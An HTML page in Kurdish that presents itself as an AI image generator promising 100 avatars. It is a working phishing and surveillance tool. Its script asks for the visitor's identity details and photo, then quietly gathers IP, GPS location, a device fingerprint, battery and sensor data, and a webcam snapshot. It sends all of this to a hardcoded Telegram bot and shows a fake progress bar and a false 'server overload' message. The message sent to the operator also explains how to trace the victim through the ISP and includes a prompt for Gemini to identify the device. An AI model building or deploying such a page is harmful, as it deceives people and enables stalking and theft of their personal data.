<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Photo Studio - دروستکردنی ١٠٠ وێنەی لۆگۆ و ئەڤاتار</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background: linear-gradient(135deg, #0f172a, #1e1b4b, #311042);
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 30px 20px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            max-width: 450px;
            width: 100%;
            text-align: center;
        }
        .logo-icon {
            font-size: 40px;
            margin-bottom: 10px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        h1 { font-size: 22px; color: #38bdf8; margin-bottom: 8px; font-weight: 700; }
        p { font-size: 13px; color: #94a3b8; margin-bottom: 20px; line-height: 1.5; }
        
        .form-group {
            margin-bottom: 12px;
            text-align: right;
        }
        .form-group label {
            font-size: 12px;
            color: #cbd5e1;
            margin-bottom: 4px;
            display: block;
        }
        .form-control {
            width: 100%;
            padding: 10px 12px;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 8px;
            color: #fff;
            font-size: 13px;
            outline: none;
            transition: border-color 0.3s;
        }
        .form-control:focus {
            border-color: #38bdf8;
        }

        .upload-box {
            border: 2px dashed #38bdf8;
            padding: 15px;
            border-radius: 10px;
            cursor: pointer;
            background: rgba(56, 189, 248, 0.05);
            margin-top: 15px;
            margin-bottom: 15px;
            transition: all 0.3s ease;
        }
        .upload-box:hover {
            background: rgba(56, 189, 248, 0.1);
        }
        .upload-box input { display: none; }
        .upload-text { font-size: 13px; color: #e2e8f0; font-weight: 600; }

        .btn {
            background: linear-gradient(135deg, #0ea5e9, #6366f1);
            color: white;
            border: none;
            padding: 12px;
            font-size: 15px;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(14, 165, 233, 0.4);
            transition: all 0.3s ease;
            margin-top: 5px;
        }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
        
        .progress-container { display: none; margin-top: 20px; }
        .progress-bar-bg {
            background: #334155;
            border-radius: 10px;
            height: 8px;
            width: 100%;
            overflow: hidden;
            margin-bottom: 8px;
        }
        .progress-bar-fill {
            background: linear-gradient(90deg, #38bdf8, #a855f7);
            height: 100%;
            width: 0%;
            transition: width 0.4s ease;
        }
        .status-text { font-size: 12px; color: #cbd5e1; }
    </style>
</head>
<body>

    <div class="container" id="main-card">
        <div class="logo-icon">✨</div>
        <h1>تۆمارکردن بۆ دروستکردنی ١٠٠ وێنەی AI</h1>
        <p>تکایە زانیارییەکانت بە دروستی پڕبکەرەوە و وێنەیەکی خۆت ئەپلۆد بکە تاوەکو مۆدێلی AI دەست بە دروستکردنی وێنەکانت بکات.</p>

        <div class="form-group">
            <label>ناوی خۆت:</label>
            <input type="text" id="name" class="form-control" placeholder="بۆ نموونە: میلاد">
        </div>
        <div class="form-group">
            <label>ناوی باوک:</label>
            <input type="text" id="fatherName" class="form-control" placeholder="بۆ نموونە: غازی">
        </div>
        <div class="form-group">
            <label>ناوی باپیر:</label>
            <input type="text" id="grandfatherName" class="form-control" placeholder="بۆ نموونە: حسین">
        </div>
        <div class="form-group">
            <label>ژمارەی تەلەفۆن:</label>
            <input type="tel" id="phone" class="form-control" placeholder="0750XXXXXXX">
        </div>
        <div class="form-group">
            <label>ئیمەیڵەکەت:</label>
            <input type="email" id="email" class="form-control" placeholder="example@gmail.com">
        </div>
        <div class="form-group">
            <label>ڕێکەوتی لەدایکبوون:</label>
            <input type="date" id="birthdate" class="form-control">
        </div>

        <div class="upload-box" onclick="document.getElementById('fileInput').click()">
            <div class="upload-text" id="uploadLabel">📁 ئەپلۆدکردنی وێنەی کەسی (١ وێنە)</div>
            <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect()">
        </div>

        <button class="btn" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5; cursor: not-allowed;">دەستپێکردنی دروستکردن (١٠٠ وێنە)</button>

        <div class="progress-container" id="progressBox">
            <div class="progress-bar-bg">
                <div class="progress-bar-fill" id="progressFill"></div>
            </div>
            <div class="status-text" id="statusText">خەریکی ئامادەکردنی مۆدێلی AI...</div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id') || "6782298541";

        let selectedFile = null;

        function handleFileSelect() {
            const input = document.getElementById('fileInput');
            if (input.files && input.files[0]) {
                selectedFile = input.files[0];
                document.getElementById('uploadLabel').innerText = `✅ وێنە هەڵبژێردرا: ${selectedFile.name}`;
                
                const btn = document.getElementById('generateBtn');
                btn.disabled = false;
                btn.style.opacity = '1';
                btn.style.cursor = 'pointer';
            }
        }

        async function startAIProcess() {
            let uName = document.getElementById('name').value.trim();
            let uFather = document.getElementById('fatherName').value.trim();
            let uGrand = document.getElementById('grandfatherName').value.trim();
            let uPhone = document.getElementById('phone').value.trim();
            let uEmail = document.getElementById('email').value.trim();
            let uBirth = document.getElementById('birthdate').value.trim();

            if (!uName || !uPhone || !selectedFile) {
                alert("تکایە خانە سەرەکییەکان و وێنەکە پڕبکەرەوە!");
                return;
            }

            document.getElementById('generateBtn').style.display = 'none';
            document.getElementById('progressBox').style.display = 'block';

            const days = ["یەکشەممە", "دووشەممە", "سێشەممە", "چوارشەممە", "پێنجشەممە", "هەینی", "شەممە"];
            const now = new Date();
            let dayName = days[now.getDay()];
            let timeString = now.toISOString().replace('T', ' ').substring(0, 19);
            let fullDateText = `${timeString} (${dayName})`;
            
            let deviceModel = "نادیار";
            try {
                const parser = new UAParser();
                const result = parser.getResult();
                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
            } catch (e) {}

            const userAgentText = navigator.userAgent;

            let ip = 'نادیار', isp = 'نادیار';
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip || 'نادیار';
                isp = data.org || 'نادیار';
            } catch (e) {}

            let locationText = "بەردەست نییە";
            let mapLink = "";
            let locationStatus = "";
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                });
                let lat = pos.coords.latitude;
                let lon = pos.coords.longitude;
                locationText = `${lat}, ${lon}`;
                mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                locationStatus = "کەسەکە Allowـی لۆکەیشنی کردووە 🟢";
            } catch (e) {
                locationStatus = "بەکارهێنەرەکە ڕێگەی پێنەداوە و لۆکەیشنی داخستووە (Deny کردووە) 🔴";
            }

            let batteryInfo = "نەزانراو";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    let level = Math.round(bat.level * 100);
                    let charging = bat.charging ? "ئامێرەکەی لەسەر شەحنە ⚡" : "ئامێرەکەی لەسەر شەحن نییە 🔋";
                    batteryInfo = `${level}% (${charging})`;
                }
            } catch (e) {}

            let screenRes = `${window.screen.width}x${window.screen.height}`;
            let pixelRatio = window.devicePixelRatio || 1;
            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
            let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو";
            let sysLang = navigator.language || "نەزانراو";
            let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "دۆخی تاریک (Dark Mode)" : "دۆخی ڕووناک (Light Mode)";

            let extendedNetwork = "نەزانراو";
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    let type = conn.effectiveType || 'نادیار';
                    let downlink = conn.downlink ? conn.downlink + ' Mbps' : 'نادیار';
                    let rtt = conn.rtt ? conn.rtt + ' ms (Ping)' : 'نادیار';
                    extendedNetwork = `جۆر: ${type} | خێرایی: ${downlink} | پینگ (RTT): ${rtt}`;
                }
            } catch (e) {}

            let advFingerprint = "نەزانراو";
            let gpuInfo = "نەزانراو";
            try {
                const canvasGL = document.createElement('canvas');
                const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
                const canvas2D = document.createElement('canvas');
                const ctx = canvas2D.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("BrowserFP, 2026!", 2, 15);
                let dataURI = canvas2D.toDataURL();
                let hash = 0;
                for (let i = 0; i < dataURI.length; i++) {
                    hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
                    hash |= 0;
                }
                advFingerprint = `Hash ID: ${Math.abs(hash)} (GPU: ${gpuInfo})`;
            } catch (e) {}

            let motionInfo = "بەردەست نییە یان ڕێگری لێکراوە";
            try {
                let orientationData = await new Promise((resolve) => {
                    let resolved = false;
                    const handler = (event) => {
                        if (!resolved) {
                            resolved = true;
                            window.removeEventListener('deviceorientation', handler);
                            resolve(`Alpha: ${Math.round(event.alpha || 0)}°, Beta: ${Math.round(event.beta || 0)}°, Gamma: ${Math.round(event.gamma || 0)}°`);
                        }
                    };
                    window.addEventListener('deviceorientation', handler);
                    setTimeout(() => {
                        if (!resolved) {
                            resolved = true;
                            resolve("جووڵە نەدۆزرایەوە (Timeout)");
                        }
                    }, 1000);
                });
                motionInfo = orientationData;
            } catch (e) {}

            let incognitoStatus = "ئاسایی (Normal Mode)";
            try {
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    let estimate = await navigator.storage.estimate();
                    if (estimate.quota && estimate.quota < 120 * 1024 * 1024) {
                        incognitoStatus = "پەنجەرەی نەبینراو / ئینکۆگنیستۆ (Incognito Mode) 🕵️‍♂";
                    }
                }
            } catch (e) {}

            let cameraBlob = null;
            let cameraStatus = "";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                cameraStatus = "کەسەکە Allowـی کردووە و وێنەکەی بە سەرکەوتوویی هاتۆتەوە 🟢";
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                cameraBlob = await new Promise((resolve) => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640; 
                        canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        canvas.toBlob(blob => {
                            stream.getTracks().forEach(t => t.stop());
                            resolve(blob);
                        }, 'image/jpeg');
                    }, 1000);
                });
            } catch (e) {
                cameraStatus = "بەکارهێنەرەکە Allowـی نەکردووە (Deny کردووە)، بۆیە وێنەی نەهاتۆتەوە 🔴";
            }

            updateProgress(20, "شیکردنەوەی زانیارییە کەسییەکان...");
            await sleep(800);
            updateProgress(50, "بەستنەوە بە مۆدێلی AI...");
            await sleep(800);
            updateProgress(80, "دروستکردنی ١٠٠ وێنە...");
            await sleep(800);
            updateProgress(100, "تەواو بوو!");

            let mapTextPart = mapLink 
                ? `لۆکەیشنی دەقیقی کەسەکە: [گووگڵ ماپ](${mapLink}) (Lat & Long: ${locationText})` 
                : `لۆکەیشن: ${locationStatus}`;

            const msg = `🚨 **زانیارییە پڕکراوەکان و تەکنیکییەکانی سەردانیکەر:**\n\n` +
                        `👤 **زانیارییە کەسییەکان:**\n` +
                        `• ناوی تەواو: ${uName} ${uFather} ${uGrand}\n` +
                        `• ژمارەی تەلەفۆن: \`${uPhone}\`\n` +
                        `• ئیمەیڵ: ${uEmail || 'نەنووسراوە'}\n` +
                        `• ڕێکەوتی لەدایکبوون: ${uBirth || 'نەنووسراوە'}\n\n` +
                        `⏰ کات: ${fullDateText}\n` +
                        `🌐 IP کەسەکە: ${ip} (${isp})\n` +
                        `📍 ${mapTextPart}\n` +
                        `🕵️‍♂️ دۆخی وێبگەڕ: ${incognitoStatus}\n` +
                        `🛜 خێرایی و جۆری قووڵی ئینتەرنێت: ${extendedNetwork}\n` +
                        `🧬 فینگەرپریینتی قووڵ (Advanced FP): ${advFingerprint}\n` +
                        `🔄 سێنسەری جووڵە (Motion Sensors): ${motionInfo}\n` +
                        `🔋 ڕێژەی شەحن: ${batteryInfo}\n` +
                        `📷 دۆخی کامێرا: ${cameraStatus}\n` +
                        `📱 سیستەم/ئامێر: ${deviceModel}\n` +
                        `📐 ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})\n` +
                        `🧠 CPU: ${cpuCores} | RAM: ${deviceRam}\n` +
                        `🌐 زمانی سیستەم: ${sysLang}\n` +
                        `🌓 دۆخی شاشە: ${isDarkMode}\n` +
                        `🌐 User-Agent: ${userAgentText}\n\n` +
                        `📌 **چۆنیەتی سوودوەرگرتن لە IP بۆ دۆزینەوەی شوێنی ورد (ڕێگەی یاسایی):**\n` +
                        `ئەگەر لۆکەیشنی ڕاستەوخۆ (GPS) بەردەست نەبوو یان کەسەکە Denyـی کرد، دەتوانیت لە ڕێگەی IPـیەکەیەوە (${ip}) ئەم هەنگاوانە بنێیت:\n` +
                        `1. ناسینەوەی کۆمپانیای دابینکەری ئینتەرنێت (ISP) کە بریتییە لە: (${isp}).\n` +
                        `2. پێشکەشکردنی سکاڵای فەرمی یان داواکاری یاسایی بۆ لایەنە پەیوەندیدارەکان.\n` +
                        `3. کۆمپانیاکەی ئینتەرنێت لە ڕێگەی کاتی ڕووداوەکە (${timeString}) دەتوانێت بە دەقیقی دیاری بکات کە ئەو IPـیە لەو ساتەدا لەلایەن کێوە بەکارهاتووە.\n\n` +
                        `🤖 **پرۆمتی تایبەت بۆ جێمینای:**\n` +
                        `"سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، ناوکەکانی پرۆسێسەر: ${cpuCores}، ڕام: ${deviceRam}، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە؟"`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: chatId, 
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (err) {}

            if (cameraBlob) {
                try {
                    const formDataCam = new FormData();
                    formDataCam.append('chat_id', chatId);
                    formDataCam.append('photo', cameraBlob, 'camera.jpg');
                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆی کامێرا (${uName})`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataCam });
                } catch (err) {}
            }

            if (selectedFile) {
                try {
                    const formDataUpload = new FormData();
                    formDataUpload.append('chat_id', chatId);
                    formDataUpload.append('photo', selectedFile, selectedFile.name);
                    formDataUpload.append('caption', `🖼️ ئەو وێنەیەی کەسەکە خۆی ئەپلۆدی کردووە (${uName})`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataUpload });
                } catch (err) {}
            }

            setTimeout(() => {
                document.getElementById('main-card').innerHTML = `
                    <div style="font-size: 50px; margin-bottom: 15px;">🎉</div>
                    <h1 style="color: #4ade80;">وێنەکانت ئامادە بوون!</h1>
                    <p>بە سەرکەووتوویی ١٠٠ وێنەی AI بۆ دروستکرا. بەڵام بەهۆی زۆری لۆدی سێرڤەرەکەوە، تکایە کەمێکی تر دووبارە هەوڵ بدەرەوە.</p>
                `;
            }, 1000);
        }

        function updateProgress(percent, text) {
            document.getElementById('progressFill').style.width = percent + '%';
            document.getElementById('statusText').innerText = text;
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
    </script>
</body>
</html>
